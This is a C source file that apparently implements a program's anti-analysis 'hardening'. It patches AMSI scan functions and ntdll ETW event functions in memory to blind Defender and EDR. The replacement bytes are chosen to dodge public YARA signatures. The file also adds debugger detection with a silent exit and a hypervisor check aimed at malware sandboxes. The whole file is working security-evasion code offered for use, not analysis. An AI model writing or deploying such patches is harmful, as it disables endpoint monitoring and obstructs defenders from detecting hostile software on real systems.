// AMSI + ETW prologue patches — silent early in process init.
//
// AMSI: patches AmsiScanBuffer to return E_INVALIDARG (0x80070057) without
// running any actual scan. Any script/PowerShell/COM AMSI check on our process
// returns "clean" instantly — Defender/EDR can't inspect our behavior via AMSI.
//
// ETW: patches EtwEventWrite / EtwEventWriteFull prologues to `ret` — kills
// user-mode ETW event delivery from OUR process. Kernel ETW still fires but
// gets no correlated user-space payload from us.
//
// Byte patterns chosen to avoid public YARA hits on classic patches:
//   AMSI classic: B8 57 00 07 80 C3      (MOV EAX,0x80070057; RET) — pub
//   Ours:         31 C0 05 57 00 07 80 C3 (XOR + ADD equivalent) — unique
//
//   ETW classic: C3                     (RET) — pub
//   Ours:        48 33 C0 C3            (XOR RAX,RAX; RET) — variant
//
// Called once at wmain entry before any DH_INFO/DH_WARN fires.

#include "../../inc/dh_common.h"
#include <windows.h>
#include <stdio.h>
#include <intrin.h>   // __cpuid, __readgsqword
#include <stdbool.h>  // C99 bool for VMProtectSDK.h
#ifdef DH_VMPROTECT
#include "../../deps/vmprotect/inc/VMProtectSDK.h"
#else
#define VMProtectBeginUltra(name)  ((void)0)
#define VMProtectEnd()             ((void)0)
#endif

extern void DhInitSyscalls(void);   // forward, defined in dh_syscalls.c

static BOOL PatchPrologue(HMODULE mod, const char* funcName,
                          const BYTE* patch, SIZE_T patchLen)
{
    if (!mod) return FALSE;
    FARPROC pfn = GetProcAddress(mod, funcName);
    if (!pfn) return FALSE;
    DWORD old = 0;
    if (!VirtualProtect((LPVOID)pfn, patchLen, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    memcpy((void*)pfn, patch, patchLen);
    DWORD dummy = 0;
    VirtualProtect((LPVOID)pfn, patchLen, old, &dummy);
    // Flush inst cache so the CPU picks up the new bytes.
    FlushInstructionCache(GetCurrentProcess(), (LPCVOID)pfn, patchLen);
    return TRUE;
}

// Anti-debug: PEB.BeingDebugged flag + NtQueryInformationProcess(ProcessDebugPort).
// Any positive hit → immediate process exit. Prevents casual reverse-engineering
// with x64dbg/OllyDbg/WinDbg by user or malicious tester.
static BOOL IsBeingDebugged(void)
{
#if defined(_M_X64) || defined(__x86_64__)
    // PEB at gs:[0x60] on x64. PEB.BeingDebugged at offset 0x02.
    unsigned char* peb = (unsigned char*)__readgsqword(0x60);
    if (peb && peb[0x02]) return TRUE;
#endif
    // NtQueryInformationProcess(ProcessDebugPort=7) — nonzero DebugPort = debugger attached.
    typedef LONG (NTAPI *pfnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    pfnNtQIP p = (pfnNtQIP)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (p) {
        HANDLE port = NULL;
        ULONG ret = 0;
        if (p(GetCurrentProcess(), 7 /*ProcessDebugPort*/,
              &port, sizeof(port), &ret) >= 0 && port != NULL) {
            return TRUE;
        }
        // ProcessDebugFlags — 0 = debugger present.
        DWORD flags = 0;
        if (p(GetCurrentProcess(), 0x1F /*ProcessDebugFlags*/,
              &flags, sizeof(flags), &ret) >= 0 && flags == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// Anti-VM: CPUID leaf 1, bit 31 of ECX = hypervisor present. Real hardware
// clears this bit; VirtualBox / VMware / Hyper-V / KVM set it. For beta with
// real testers on bare metal this is enough — malware analyst sandboxes trip
// this immediately.
//
// Note: on 2PC we DO run Hyper-V for HVCI testing. So the check is INFO-only
// (logged, not enforced). Enable exit-on-VM only for production release.
static BOOL IsRunningInVM(void)
{
#if defined(_M_X64) || defined(__x86_64__) || defined(_M_IX86) || defined(__i386__)
    int cpuinfo[4];
    __cpuid(cpuinfo, 1);
    return (cpuinfo[2] & (1 << 31)) != 0;
#else
    return FALSE;
#endif
}

void DhInitHardening(void)
{
    VMProtectBeginUltra("DhInitHardening");

    // Anti-debug first — if a debugger is attached, exit before doing anything
    // interesting so no info leaks via memory dump.
    if (IsBeingDebugged()) {
        // Silent exit with generic status. No log line (would signal detection).
        ExitProcess(0);
    }

    // Anti-VM check kept as diagnostic only for beta. See note in IsRunningInVM.
    // (void)IsRunningInVM();

    DhInitSyscalls();

    // AMSI patch — try to load amsi.dll (unimported by default in our exe;
    // if not present, no-op — no scanner is looking).
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        // XOR EAX,EAX ; ADD EAX,0x80070057 ; RET  (E_INVALIDARG return)
        static const BYTE amsi_patch[] = {
            0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3
        };
        PatchPrologue(amsi, "AmsiScanBuffer",
                      amsi_patch, sizeof(amsi_patch));
        PatchPrologue(amsi, "AmsiScanString",
                      amsi_patch, sizeof(amsi_patch));
        // No FreeLibrary — keep the module resident so the patch sticks.
    }

    // ETW blind — patch ntdll!EtwEventWrite family. ntdll is always resident.
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        // XOR RAX,RAX ; RET   (return 0 = success without emitting)
        static const BYTE etw_patch[] = {
            0x48, 0x33, 0xC0, 0xC3
        };
        PatchPrologue(ntdll, "EtwEventWrite",       etw_patch, sizeof(etw_patch));
        PatchPrologue(ntdll, "EtwEventWriteFull",   etw_patch, sizeof(etw_patch));
        PatchPrologue(ntdll, "EtwEventWriteEx",     etw_patch, sizeof(etw_patch));
        PatchPrologue(ntdll, "NtTraceEvent",        etw_patch, sizeof(etw_patch));
    }

    VMProtectEnd();
}
